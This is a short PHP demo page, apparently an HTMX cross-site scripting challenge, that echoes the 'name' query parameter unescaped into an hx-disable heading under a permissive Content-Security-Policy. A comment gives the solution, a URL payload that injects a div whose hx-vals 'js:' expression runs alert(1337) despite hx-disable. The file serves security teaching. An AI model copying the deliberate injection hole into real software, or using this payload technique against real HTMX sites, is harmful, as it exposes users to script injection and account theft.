<?php
header("Content-Security-Policy: sandbox allow-scripts allow-modals; default-src 'self' https://demo.sjoerdlangkemper.nl https://test.sjoerdlangkemper.nl; style-src 'self' 'sha256-pgn1TCGZX6O77zDvy0oTODMOxemn0oj0LeCnQTRj7Kg='; script-src 'self' 'unsafe-inline' 'unsafe-eval'");
// Solution: disable.php?name=</h1><div%20hx-vals=%27js:"a":alert(1337)%27%20hx-get="/"%20hx-trigger=%27load%27>foo</div>
?>
<!doctype html>
<html>
    <head>
        <title>HTMX demo page</title>
        <script src="htmx.js"></script>
    </head>
    <body>
        <h1 hx-disable>Hello <?php echo $_GET['name'] ?? 'anon'; ?></h1>
        <div hx-get="enabled.php" hx-trigger="load">
            HTMX is not enabled or not working correctly.
        </div>
    </body>
</html>
